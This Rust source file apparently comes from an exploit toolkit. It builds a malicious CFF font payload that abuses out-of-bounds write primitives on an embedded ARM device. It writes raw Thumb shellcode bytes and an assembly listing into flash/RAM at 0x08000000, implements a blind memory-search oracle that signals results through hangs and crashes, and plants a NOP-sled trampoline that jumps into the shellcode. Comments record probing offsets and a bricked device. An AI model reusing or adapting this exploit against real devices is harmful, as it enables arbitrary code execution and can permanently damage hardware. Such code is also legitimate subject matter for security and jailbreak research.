use capstone::{arch, Capstone};
use capstone::arch::BuildsCapstone;
use crate::payload::{CffPayloadBuilder, Payload};
use crate::payload::exploit_config::ExploitConfig;

#[derive(Default)]
pub struct BinarySearch7gPayload {}

impl Payload for BinarySearch7gPayload {
    fn build_cff<Cfg: ExploitConfig>(&self, b: &mut CffPayloadBuilder) {
        // Lets make sure we have lots of space
        // Not fully needed but should help with blind reliability
        b.index_write(Cfg::OFFSET_BUILDCHAR_LEN_PTR, i32::MAX as u32);

        // Set our write target to start of ram
        b.index_write(Cfg::OFFSET_BUILDCHAR_PTR, 0x0800_0000_u32);


        //What do we know:
        // - Appl exists @ 0xcfc8
        // - overwriting the place where we put our trampoline does nothing - odd
        // - Overwriting the first 0x1000 bytes - crash, wonder if the appl str is here
        // - Overwriting the first 0x800 bytes - nothing
        // Current memory understanding:
        // 0x0800_0000 - 0x0800_0030 = shellcode
        // 0x0800_0030 - 0x0800_cfc8 = no Appl
        // 0x0800_cfcc = Appl
        // 0x0800_cfd0 - 0x0802_0000 = no appl


        {
            // TODO: finish this when you have a non-bricked device
            //  search for 0x1267 (shellcode is correct for code below), maybe can leak a few bytes that way

            {
                let mut tmp = Vec::new();

                tmp.extend_from_slice(
b"\x06\x49\x07\x4b\x07\x4c\x0a\x68\xd2\x1a\x03\xd0\x04\x31\x62\x1a\x01\xd0\xf8\xe7\xfe\xe7\x04\x48\x80\x47\x00\xbf\x50\x00\x00\x08\x67\x12\x00\x00\x00\xd0\x00\x08\x00\x00\x00\x08"

                );

                //cf50 - d000 hang
                //cff0 - d000 crash
                //cf70 - d000 hang
                //cfa0 - d000 hang
                //cfa0 - cff0 hang
                //cfa0 - cfe0 hang
                //cfa0 - cfc0 crash
                //cfc0 - cfe0 hang
                //cfd0 - cfe0 crash
                //cfc8 - cfd0 hang
                //cfcc - cfd0 crash so its at 0x0800_cfc8

                /*
ldr r1, =0x08000050
ldr r3, =0x00001267
ldr r4, =0x0c000000

_loop:
ldr r2, [r1]
subs r2, r2, r3
beq hang
adds r1, #4
subs r2, r4, r1
beq crash
b _loop

hang:
b hang

crash:
ldr r0, =0x08000000
blx r0
         */

                {
                    let cs = Capstone::new()
                        .arm()
                        .mode(arch::arm::ArchMode::Thumb)
                        .detail(true)
                        .build()
                        .expect("Failed to create Capstone object");

                    let insns = cs.disasm_all(&tmp, 0x1000)
                        .expect("Failed to disassemble");

                    for i in insns.as_ref() {
                        println!("{}", i);
                    }
                }

                for (idx, t) in tmp.chunks(4).enumerate() {
                    let mut tmp = [0u8, 0, 0, 0];
                    tmp[..t.len()].copy_from_slice(t);

                    b.index_write_array(idx as u16, tmp);
                }
            }

            {
                let code = b"\x00\x49\x88\x47\x01\x00\x00\x08".to_vec();

                let mut tmp = {
                    let mut t = crate::cringestone::ThumbAsm::default();
                    //0-4000 nop + loop = crash
                    //0-2000 nop + loop = crash
                    //0-2000 loop = crash hmm
                    for _ in 0..20 {
                        t.nop();
                    }

                    t.build()
                };
                tmp.extend_from_slice(&code);

                for (idx, t) in tmp.chunks(4).enumerate() {
                    let mut tmp = [0u8, 0, 0, 0];
                    tmp[..t.len()].copy_from_slice(t);

                  b.index_write_array(idx as u16 + (0x820 + 32 + 100 + 50 + 25) / 4, tmp);
                }
            }
        }
    }
}